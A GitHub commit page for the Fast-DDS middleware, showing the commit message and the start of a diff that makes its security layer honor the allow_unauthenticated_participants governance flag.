=== Content from github.com_0cbbe40e_20250110_231636.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FeProsima%2FFast-DDS%2Fcommit%2Ff07a0213e655202188840b864be4438ae1067a13)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FeProsima%2FFast-DDS%2Fcommit%2Ff07a0213e655202188840b864be4438ae1067a13)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=eProsima%2FFast-DDS)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[eProsima](/eProsima)
/
**[Fast-DDS](/eProsima/Fast-DDS)**
Public

* [Notifications](/login?return_to=%2FeProsima%2FFast-DDS) You must be signed in to change notification settings
* [Fork
  787](/login?return_to=%2FeProsima%2FFast-DDS)
* [Star
   2.3k](/login?return_to=%2FeProsima%2FFast-DDS)

* [Code](/eProsima/Fast-DDS)
* [Issues
  48](/eProsima/Fast-DDS/issues)
* [Pull requests
  78](/eProsima/Fast-DDS/pulls)
* [Discussions](/eProsima/Fast-DDS/discussions)
* [Actions](/eProsima/Fast-DDS/actions)
* [Projects
  0](/eProsima/Fast-DDS/projects)
* [Security](/eProsima/Fast-DDS/security)
* [Insights](/eProsima/Fast-DDS/pulse)

Additional navigation options

* [Code](/eProsima/Fast-DDS)
* [Issues](/eProsima/Fast-DDS/issues)
* [Pull requests](/eProsima/Fast-DDS/pulls)
* [Discussions](/eProsima/Fast-DDS/discussions)
* [Actions](/eProsima/Fast-DDS/actions)
* [Projects](/eProsima/Fast-DDS/projects)
* [Security](/eProsima/Fast-DDS/security)
* [Insights](/eProsima/Fast-DDS/pulse)

## Commit

[Permalink](/eProsima/Fast-DDS/commit/f07a0213e655202188840b864be4438ae1067a13)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Honor allow\_unauthenticated\_participants flag ([#3385](https://github.com/eProsima/Fast-DDS/pull/3385)) ([#3520](https://github.com/eProsima/Fast-DDS/pull/3520))

[Browse files](/eProsima/Fast-DDS/tree/f07a0213e655202188840b864be4438ae1067a13)
Browse the repository at this point in the history

```
* Refs #17294: Add communication Simple Test

Signed-off-by: Mario Dominguez <mariodominguez@eprosima.com>

* Refs #17294: Retrieve allow_unauthenticated_participants from governance rules

Signed-off-by: Mario Dominguez <mariodominguez@eprosima.com>

* Refs #17294: on_validation_failed() method on Security Manager. Honor allow_unauthenticated flag

Signed-off-by: Mario Dominguez <mariodominguez@eprosima.com>

* Refs #17294: EndpointSecurityAttributes false on construction. Dont take nothing for granted

Signed-off-by: Mario Dominguez <mariodominguez@eprosima.com>

* Refs #17294: Linter

Signed-off-by: Mario Dominguez <mariodominguez@eprosima.com>

* Refs #17294: BlackBox Tests

Signed-off-by: Mario Dominguez <mariodominguez@eprosima.com>

* Refs #17294: Fix exponential times when sending handshake request

Signed-off-by: Mario Dominguez <mariodominguez@eprosima.com>

* Refs #17294: Resolve to validation_failed if the number of handshake requests sent exceeds a limit

Signed-off-by: Mario Dominguez <mariodominguez@eprosima.com>

* Refs #17294: add notify_secure_endpoints flag to notifyAboveRemoteEndpoints()

Signed-off-by: Mario Dominguez <mariodominguez@eprosima.com>

* Refs #17294: add assign_secure_endpoints flag to EDP assignRemoteEndpoints()

Signed-off-by: Mario Dominguez <mariodominguez@eprosima.com>

* Refs #17294: add assign_secure_endpoints flag to WLP assignRemoteEndpoints()

Signed-off-by: Mario Dominguez <mariodominguez@eprosima.com>

* Refs #17294: honor allow_unauthenticated_participants if validation fails

Signed-off-by: Mario Dominguez <mariodominguez@eprosima.com>

* Refs #17294: Linter

Signed-off-by: Mario Dominguez <mariodominguez@eprosima.com>

* Refs #17294: remove extra header

Signed-off-by: Mario Dominguez <mariodominguez@eprosima.com>

* Refs #17294: Added suggested test case scenario

Signed-off-by: Mario Dominguez <mariodominguez@eprosima.com>

* Refs #17294: Fix Security Memory Leaks and Corrected Condition

Signed-off-by: Mario Dominguez <mariodominguez@eprosima.com>

---------

Signed-off-by: Mario Dominguez <mariodominguez@eprosima.com>
(cherry picked from commit [9adaf25](https://github.com/eProsima/Fast-DDS/commit/9adaf251b4708617e4364ba167da641e25a3f7de))

Co-authored-by: Mario Domínguez López <116071334+Mario-DL@users.noreply.github.com>
```

* Loading branch information

[![@mergify](https://avatars.githubusercontent.com/in/10562?s=40&v=4)](/marketplace/mergify) [![@Mario-DL](https://avatars.githubusercontent.com/u/116071334?s=40&v=4)](/Mario-DL)

[mergify[bot]](/eProsima/Fast-DDS/commits?author=mergify%5Bbot%5D "View all commits by mergify[bot]")
and
[Mario-DL](/eProsima/Fast-DDS/commits?author=Mario-DL "View all commits by Mario-DL")
authored
Jun 5, 2023

1 parent
[ef180e2](/eProsima/Fast-DDS/commit/ef180e220dd286b2bcc545536e78e46a6544ed3e)

commit f07a021

 Show file tree

 Hide file tree

Showing
**57 changed files**
with
**1,678 additions**
and
**151 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* include/fastdds/rtps

  + builtin

    - discovery

      * endpoint

        + include/fastdds/rtps/builtin/discovery/endpoint/EDP.h
          [EDP.h](#diff-df3c765d6e6f7c461d6f63404da4e31b8a79797863330eed025d6fbb822cb74a)
        + include/fastdds/rtps/builtin/discovery/endpoint/EDPSimple.h
          [EDPSimple.h](#diff-e910f55f42f3eb2e8f59719350efa16339b30d51decd82f6cd5c02a25c1b0a37)
        + include/fastdds/rtps/builtin/discovery/endpoint/EDPStatic.h
          [EDPStatic.h](#diff-e21b2e5c098620fa91f3561801bc1d71127ce0495e65bad53c64d0014c00ed2b)
      * participant

        + include/fastdds/rtps/builtin/discovery/participant/PDP.h
          [PDP.h](#diff-5a2ff98371f4cb401f8a248874463c40a4b405221164c31be21e29d8e8911b9c)
        + include/fastdds/rtps/builtin/discovery/participant/PDPSimple.h
          [PDPSimple.h](#diff-14d7b58280b73856bfbd5d872fc65a44907722494984c7a53d86715f262f7041)
    - liveliness

      * include/fastdds/rtps/builtin/liveliness/WLP.h
        [WLP.h](#diff-6f7d8baa11b64c0b9434bc489685deb5626890cc4fde2f736fc18a9f3a9b6511)
  + security/accesscontrol

    - include/fastdds/rtps/security/accesscontrol/EndpointSecurityAttributes.h
      [EndpointSecurityAttributes.h](#diff-bb5af4732cfdfb37a3495c815918aa069dca7d15f6cb4c1ed7f2368cfd7c6285)
* src/cpp

  + rtps

    - builtin

      * discovery

        + endpoint

          - src/cpp/rtps/builtin/discovery/endpoint/EDPSimple.cpp
            [EDPSimple.cpp](#diff-87d4f80f7a794b767f4d500c78d71c7bc447f87026ce3c1f45269911638a0427)
          - src/cpp/rtps/builtin/discovery/endpoint/EDPStatic.cpp
            [EDPStatic.cpp](#diff-c384bfe7dae7ef4c25c6eb09efa63f6e82c47b5a7dafed43f439bfb225202cd5)
        + participant

          - src/cpp/rtps/builtin/discovery/participant/PDPClient.cpp
            [PDPClient.cpp](#diff-ea4a9f4ae59cc71c3bb0478382c893462a95bae2c0d8504b19dfb13a1a984457)
          - src/cpp/rtps/builtin/discovery/participant/PDPClient.h
            [PDPClient.h](#diff-85be9b4a6d1abc0f4513b8a68cb76bfe771840413246ce3885d5afb902b3c203)
          - src/cpp/rtps/builtin/discovery/participant/PDPListener.cpp
            [PDPListener.cpp](#diff-4716be00d7038bf256e2eab48c89d12d41cc1c253e4e7c68ce075c2a61d33060)
          - src/cpp/rtps/builtin/discovery/participant/PDPServer.cpp
            [PDPServer.cpp](#diff-56b23866a90ffcf208e729e2afdd347e81a0a903eec3531272b0a3ba983536c5)
          - src/cpp/rtps/builtin/discovery/participant/PDPServer.hpp
            [PDPServer.hpp](#diff-88016934dac6369da3df35e053da7a3260ba53d297675a90b4a70744b135f247)
          - src/cpp/rtps/builtin/discovery/participant/PDPServerListener.cpp
            [PDPServerListener.cpp](#diff-3a8f686d09809f275db1349ffa8f940e5636fcfaf94fa2be5e3348e353283b56)
          - src/cpp/rtps/builtin/discovery/participant/PDPSimple.cpp
            [PDPSimple.cpp](#diff-c99cdcc9c9ac755e92c309ceb5097c5590799e9722ad9f27ef884a6d9d105846)
          - timedevent

            * src/cpp/rtps/builtin/discovery/participant/timedevent/DSClientEvent.cpp
              [DSClientEvent.cpp](#diff-c284654b01cc1e7337a81629162a99139ac8b1e09516ecf0a088cdd45924fed9)
      * liveliness

        + src/cpp/rtps/builtin/liveliness/WLP.cpp
          [WLP.cpp](#diff-f9ec04d8a2c8ad8c845848ee1917a4007f1f1eb5bc93f45a7ca15f2d442ec87e)
    - security

      * src/cpp/rtps/security/SecurityManager.cpp
        [SecurityManager.cpp](#diff-196ca7d94f1ae6a62cc591590a6742796c6201afbdbfe84ebedd40d225e12888)
      * src/cpp/rtps/security/SecurityManager.h
        [SecurityManager.h](#diff-d0e76b0709b7fdbad6b50985d69084bbaab457688e79fe98e2df5805a0da2787)
  + security

    - accesscontrol

      * src/cpp/security/accesscontrol/Permissions.cpp
        [Permissions.cpp](#diff-a9923d15439c71170bbfd855d3c33fac09f839272083bf8ea56a3af71977d9cb)
    - authentication

      * src/cpp/security/authentication/PKIDH.cpp
        [PKIDH.cpp](#diff-b8725b82c39548c31026b866d01f3cb18b618f89ff151ae3f701fa04891e040d)
* test

  + blackbox/common

    - test/blackbox/common/BlackboxTestsSecurity.cpp
      [BlackboxTestsSecurity.cpp](#diff-c875ffe0203903a09d102f401a8749bd255b84696d69d7afa508b4976437bcf3)
  + certs

    - certs

      * test/certs/certs/AE7BAD8C075AEAF8.pem
        [AE7BAD8C075AEAF8.pem](#diff-27c4e6047477f8936e46735bb911d5ecd7847e9b004808b3053791d20c17531d)
    - test/certs/ecdsaparam
      [ecdsaparam](#diff-646a5a0cba2b8511c80a7b8f8da9d3b650c77b6fed75361712e3314a7dc5cdf8)
    - test/certs/governance\_allow\_unauth\_all\_disabled\_access\_none.smime
      [governance\_allow\_unauth\_all\_disabled\_access\_none.smime](#diff-cf9359ac7257e2e76e5ea29c5a424dfe9c28da7ca9c58ed0ffce42172f18379f)
    - test/certs/governance\_allow\_unauth\_all\_disabled\_access\_none.xml
      [governance\_allow\_unauth\_all\_disabled\_access\_none.xml](#diff-4cc62a37a0ea3501fad69ba8c8fcae2b2af8d51d69c0780ba1521122718a6436)
    - test/certs/governance\_allow\_unauth\_all\_disabled\_access\_none\_other\_ca.smime
      [governance\_allow\_unauth\_all\_disabled\_access\_none\_other\_ca.smime](#diff-14834c016d1127b4fda2449e97c55b69bf0b3000308af5beec1f8a1c2abf3166)
    - test/certs/governance\_allow\_unauth\_all\_disabled\_read\_write\_enabled.smime
      [governance\_allow\_unauth\_all\_disabled\_read\_write\_enabled.smime](#diff-2def8e65245e159bd902320ba502bd38a01d8ad0b417a6438c02aa6d9d26fa18)
    - test/certs/governance\_allow\_unauth\_all\_disabled\_read\_write\_enabled.xml
      [governance\_allow\_unauth\_all\_disabled\_read\_write\_enabled.xml](#diff-2310481c1f4bb5a550e9690dda5c198f7f92fe0e25d22775662fa4f5672ff35b)
    - test/certs/governance\_allow\_unauth\_all\_disabled\_read\_write\_enabled\_other\_ca.smime
      [governance\_allow\_unauth\_all\_disabled\_read\_write\_enabled\_other\_ca.smime](#diff-036a683767c704b9dbdb63089060d92f24ae6693e767656cc77c8d171a15317b)
    - test/certs/governance\_allow\_unauth\_rtps\_encrypt.smime
      [governance\_allow\_unauth\_rtps\_encrypt.smime](#diff-aa357c204bc3dd3d1b589f7503d3bf7fa16d87330d4f901d198ee6998a156116)
    - test/certs/governance\_allow\_unauth\_rtps\_encrypt.xml
      [governance\_allow\_unauth\_rtps\_encrypt.xml](#diff-b97b8f2a8a6eaa20df3d6c37da5a7f43dd20c2c9bce21d287350fb9f97915007)
    - test/certs/index\_other.txt
      [index\_other.txt](#diff-0f1f54b17d49f39c4dffb8c91560a3175734d149948ae88bb377b88fb43e88fd)
    - test/certs/othercacert.pem
      [othercacert.pem](#diff-8f67d7b79450abce71e589f77dfbe170c2fdc3aaaab11a596db986444b36cca4)
    - test/certs/othercacert.txt
      [othercacert.txt](#diff-30204f05e5bfe3edb45beac9adeb3a98de60e5d91e82ccdd918ff4728d561e69)
    - test/certs/othercaconf.cnf
      [othercaconf.cnf](#diff-324f7a0a47755e33f11833c2495f9bdf8338ed039219852f8d4e0b8b52f6a819)
    - test/certs/othercakey.pem
      [othercakey.pem](#diff-13c3573dedb641f3c3e314628e9de135997710354b316dd0fb85cf270618d690)
    - test/certs/othersub.cnf
      [othersub.cnf](#diff-eb56878b49a2fbebf9cdcfc8e2cdd233cc0e3949a08750ebcd9435d6f84d7cfa)
    - test/certs/othersubcert.pem
      [othersubcert.pem](#diff-3c7bcf0dc642943cb42498c350784013bf01848db0c5e6a89ea1d74e85dd291a)
    - test/certs/othersubcert.txt
      [othersubcert.txt](#diff-14a04e0be62a7341f46365ddc46a728011fefaffc262b920e467f54a9ac3268a)
    - test/certs/othersubkey.pem
      [othersubkey.pem](#diff-dad7d12343ef9f6019bb0a39c1a69ac295cfc86beb933bfa80146a17cc27af62)
    - test/certs/othersubreq.pem
      [othersubreq.pem](#diff-9d3f9cd9d8485e7275515d8d54f592e3a52bf5efc0cb1d095c2a70356b59ef6f)
    - test/certs/permissions\_helloworld\_securehelloworld.smime
      [permissions\_helloworld\_securehelloworld.smime](#diff-519b70635fbb8bdbc5220f564bd2d55fd9185e5e2f3999ec9bef5a2cfab6dccc)
    - test/certs/permissions\_helloworld\_securehelloworld.xml
      [permissions\_helloworld\_securehelloworld.xml](#diff-defaf7c18daf300a6161a97f9d1dd8f9d4fe4fe1431102c8e22c001eecd57d13)
    - test/certs/permissions\_helloworld\_securehelloworld\_other\_ca.smime
      [permissions\_helloworld\_securehelloworld\_other\_ca.smime](#diff-778ee78b8b793d56aec93708dc64e1d1a980719778c80bf04833149d9ebeda78)
    - test/certs/permissions\_helloworld\_securehelloworld\_other\_ca.xml
      [permissions\_helloworld\_securehelloworld\_other\_ca.xml](#diff-c8118e3923c49d7cdf251851f7fd4d91ca8b7cfebcbff1e3c63405ba1bc1da85)
    - test/certs/serial\_other
      [serial\_other](#diff-986a7dde3cf6a0ff464e191110fe694a89cf8311458b97e9295ca391387ce0dd)
  + communication

    - test/communication/CMakeLists.txt
      [CMakeLists.txt](#diff-6cad93b063fb6d463ba627e32b899eb7d83feee8624ab1d539fc7bcb7de45a6a)
    - test/communication/simple\_allow\_unauthenticated\_sub\_profile.xml
      [simple\_allow\_unauthenticated\_sub\_profile.xml](#diff-4720dbee7efd5a0e8fbe0fb1f1a895510115d66298182a4f3c8bd8b041115c29)
    - test/communication/simple\_secure\_allow\_unauthenticated\_pub\_profile.xml
      [simple\_secure\_allow\_unauthenticated\_pub\_profile.xml](#diff-2c2d84b9aca3d8235eedc1fb08cb256d3ab22e5c934402d644e8d154b200add0)
  + mock/rtps

    - PDP/fastdds/rtps/builtin/discovery/participant

      * test/mock/rtps/PDP/fastdds/rtps/builtin/discovery/participant/PDP.h
        [PDP.h](#diff-3a4e5fbc10d372150eed1344155657cc7187b272da6bc39a861bd284846a3318)
    - PDPSimple/fastdds/rtps/builtin/discovery/participant

      * test/mock/rtps/PDPSimple/fastdds/rtps/builtin/discovery/participant/PDPSimple.h
        [PDPSimple.h](#diff-318d359dc4b31e74308649f134d95e744a55cdfb6c7ed3a695958b35f5c04017)
  + unittest/rtps

    - discovery

      * test/unittest/rtps/discovery/EdpTests.cpp
        [EdpTests.cpp](#diff-06b6b40d3daf5f95c583351ff890b89302cbd940087b90b677daae44002b0c5e)
    - security

      * test/unittest/rtps/security/SecurityHandshakeProcessTests.cpp
        [SecurityHandshakeProcessTests.cpp](#diff-8389944eaeaf094a0cac8b021ccbf3a25e80897e879402d5e79662a03c5d91cc)
      * test/unittest/rtps/security/SecurityTests.cpp
        [SecurityTests.cpp](#diff-24eb94542ab20bdc518e1e23b94d77d87f67f40a766945428c53700951f1212a)
      * test/unittest/rtps/security/SecurityValidationRemoteTests.cpp
        [SecurityValidationRemoteTests.cpp](#diff-233f34bd870000f58dd7db5eba43aa52ea31e5ccb11f49a8c44aa7020576f5f8)

## There are no files selected for viewing

4 changes: 3 additions & 1 deletion

4
[include/fastdds/rtps/builtin/discovery/endpoint/EDP.h](#diff-df3c765d6e6f7c461d6f63404da4e31b8a79797863330eed025d6fbb822cb74a "include/fastdds/rtps/builtin/discovery/endpoint/EDP.h")

Show comments

[View file](/eProsima/Fast-DDS/blob/f07a0213e655202188840b864be4438ae1067a13/include/fastdds/rtps/builtin/discovery/endpoint/EDP.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -103,9 +103,11 @@ class EDP |
|  |  | /\*\* |
|  |  | \* Abstract method that assigns remote endpoints when a new RTPSParticipantProxyData is discovered. |
|  |  | \* @param pdata Discovered ParticipantProxyData |
|  |  | \* @param assign\_secure\_endpoints Whether to try assigning secure endpoints |
|  |  | \*/ |
|  |  | virtual void assignRemoteEndpoints( |
|  |  | const ParticipantProxyData& pdata) = 0; |
|  |  | const ParticipantProxyData& pdata, |
|  |  | bool assign\_secure\_endpoints) = 0; |
|  |  | /\*\* |
|  |  | \* Remove remote endpoints from the endpoint discovery protocol |
|  |  | \* @param pdata Pointer to the ParticipantProxyData to remove |
| Expand Down | |  |

4 changes: 3 additions & 1 deletion

4
[include/fastdds/rtps/builtin/discovery/endpoint/EDPSimple.h](#diff-e910f55f42f3eb2e8f59719350efa16339b30d51decd82f6cd5c02a25c1b0a37 "include/fastdds/rtps/builtin/discovery/endpoint/EDPSimple.h")

Show comments

[View file](/eProsima/Fast-DDS/blob/f07a0213e655202188840b864be4438ae1067a13/include/fastdds/rtps/builtin/discovery/endpoint/EDPSimple.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -102,9 +102,11 @@ class EDPSimple : public EDP |
|  |  | /\*\* |
|  |  | \* This method assigns the remote builtin endpoints that the remote RTPSParticipant indicates is using to our local builtin endpoints. |
|  |  | \* @param pdata Pointer to the RTPSParticipantProxyData object. |
|  |  | \* @param assign\_secure\_endpoints Whether to try assigning secure endpoints |
|  |  | \*/ |
|  |  | void assignRemoteEndpoints( |
|  |  | const ParticipantProxyData& pdata) override; |
|  |  | const ParticipantProxyData& pdata, |
|  |  | bool assign\_secure\_endpoints) override; |
|  |  | /\*\* |
|  |  | \* Remove remote endpoints from the endpoint discovery protocol |
|  |  | \* @param pdata Pointer to the ParticipantProxyData to remove |
| Expand Down | |  |

4 changes: 3 additions & 1 deletion

4
[include/fastdds/rtps/builtin/discovery/endpoint/EDPStatic.h](#diff-e21b2e5c098620fa91f3561801bc1d71127ce0495e65bad53c64d0014c00ed2b "include/fastdds/rtps/builtin/discovery/endpoint/EDPStatic.h")

Show comments

[View file](/eProsima/Fast-DDS/blob/f07a0213e655202188840b864be4438ae1067a13/include/fastdds/rtps/builtin/discovery/endpoint/EDPStatic.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -66,9 +66,11 @@ class EDPStatic : public EDP |
|  |  | /\*\* |
|  |  | \* Abstract method that assigns remote endpoints when a new RTPSParticipantProxyData is discovered. |
|  |  | \* @param pdata Pointer to the ParticipantProxyData. |
|  |  | \* @param assign\_secure\_endpoints Whether to try assigning secure endpoints |
|  |  | \*/ |
|  |  | void assignRemoteEndpoints( |
|  |  | const ParticipantProxyData& pdata) override; |
|  |  | const ParticipantProxyData& pdata, |
|  |  | bool assign\_secure\_endpoints) override; |
|  |  | /\*\* |
|  |  | \* Abstract method that removes a local Reader from the discovery method |
|  |  | \* @param R Pointer to the Reader to remove. |
| Expand Down | |  |

4 changes: 3 additions & 1 deletion

4
[include/fastdds/rtps/builtin/discovery/participant/PDP.h](#diff-5a2ff98371f4cb401f8a248874463c40a4b405221164c31be21e29d8e8911b9c "include/fastdds/rtps/builtin/discovery/participant/PDP.h")

Show comments

[View file](/eProsima/Fast-DDS/blob/f07a0213e655202188840b864be4438ae1067a13/include/fastdds/rtps/builtin/discovery/participant/PDP.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -279,9 +279,11 @@ class PDP |
|  |  | /\*\* |
|  |  | \* Override to match additional endpoints to PDP. Like EDP or WLP. |
|  |  | \* @param pdata Pointer to the ParticipantProxyData object. |
|  |  | \* @param notify\_secure\_endpoints Whether to try notifying secure endpoints. |
|  |  | \*/ |
|  |  | virtual void notifyAboveRemoteEndpoints( |
|  |  | const ParticipantProxyData& pdata) = 0; |
|  |  | const ParticipantProxyData& pdata, |
|  |  | bool notify\_secure\_endpoints) = 0; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Some PDP classes require EDP matching with update PDP DATAs like EDPStatic |
| Expand Down | |  |

8 changes: 5 additions & 3 deletions

8
[include/fastdds/rtps/builtin/discovery/participant/PDPSimple.h](#diff-14d7b58280b73856bfbd5d872fc65a44907722494984c7a53d86715f262f7041 "include/fastdds/rtps/builtin/discovery/participant/PDPSimple.h")

Show comments

[View file](/eProsima/Fast-DDS/blob/f07a0213e655202188840b864be4438ae1067a13/include/fastdds/rtps/builtin/discovery/participant/PDPSimple.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -100,11 +100,13 @@ class PDPSimple : public PDP |
|  |  | ParticipantProxyData\* pdata) override; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* This method notifies EDP and WLP of the existence of a new participant. |
|  |  | \* @param pdata |
|  |  | \* Override to match additional endpoints to PDP. Like EDP or WLP. |
|  |  | \* @param pdata Pointer to the ParticipantProxyData object. |
|  |  | \* @param notify\_secure\_endpoints Whether to try notifying secure endpoints. |
|  |  | \*/ |
|  |  | void notifyAboveRemoteEndpoints( |
|  |  | const ParticipantProxyData& pdata) override; |
|  |  | const ParticipantProxyData& pdata, |
|  |  | bool notify\_secure\_endpoints) override; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Activate a new Remote Endpoint that has been statically discovered. |
| Expand Down | |  |

4 changes: 3 additions & 1 deletion

4
[include/fastdds/rtps/builtin/liveliness/WLP.h](#diff-6f7d8baa11b64c0b9434bc489685deb5626890cc4fde2f736fc18a9f3a9b6511 "include/fastdds/rtps/builtin/liveliness/WLP.h")

Show comments

[View file](/eProsima/Fast-DDS/blob/f07a0213e655202188840b864be4438ae1067a13/include/fastdds/rtps/builtin/liveliness/WLP.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -81,10 +81,12 @@ class WLP |
|  |  | /\*\* |
|  |  | \* Assign the remote endpoints for a newly discovered RTPSParticipant. |
|  |  | \* @param pdata Pointer to the RTPSParticipantProxyData object. |
|  |  | \* @param assign\_secure\_endpoints Whether to try assigning secure endpoints. |
|  |  | \* @return True if correct. |
|  |  | \*/ |
|  |  | bool assignRemoteEndpoints( |
|  |  | const ParticipantProxyData& pdata); |
|  |  | const ParticipantProxyData& pdata, |
|  |  | bool assign\_secure\_endpoints); |
|  |  | /\*\* |
|  |  | \* Remove remote endpoints from the liveliness protocol. |
|  |  | \* @param pdata Pointer to the ParticipantProxyData to remove |
| Expand Down | |  |

129 changes: 87 additions & 42 deletions

129
[include/fastdds/rtps/security/accesscontrol/EndpointSecurityAttributes.h](#diff-bb5af4732cfdfb37a3495c815918aa069dca7d15f6cb4c1ed7f2368cfd7c6285 "include/fastdds/rtps/security/accesscontrol/EndpointSecurityAttributes.h")

Show comments

[View file](/eProsima/Fast-DDS/blob/f07a0213e655202188840b864be4438ae1067a13/include/fastdds/rtps/security/accesscontrol/EndpointSecurityAttributes.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -36,14 +36,19 @@ typedef uint32\_t PluginEndpointSecurityAttributesMask; |
|  |  |  |
|  |  | struct PluginEndpointSecurityAttributes |
|  |  | { |
|  |  | PluginEndpointSecurityAttributes() : |
|  |  | is\_submessage\_encrypted(false), is\_submessage\_origin\_authenticated(false), is\_payload\_encrypted(false) |
|  |  | { } |
|  |  |  |
|  |  | explicit PluginEndpointSecurityAttributes(const PluginEndpointSecurityAttributesMask mask) : |
|  |  | is\_submessage\_encrypted((mask & PLUGIN\_ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_SUBMESSAGE\_ENCRYPTED) != 0), |
|  |  | is\_submessage\_origin\_authenticated((mask & PLUGIN\_ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_SUBMESSAGE\_ORIGIN\_AUTHENTICATED) != 0), |
|  |  | is\_payload\_encrypted((mask & PLUGIN\_ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_PAYLOAD\_ENCRYPTED) != 0) |
|  |  | PluginEndpointSecurityAttributes() |
|  |  | : is\_submessage\_encrypted(false) |
|  |  | , is\_submessage\_origin\_authenticated(false) |
|  |  | , is\_payload\_encrypted(false) |
|  |  | { |
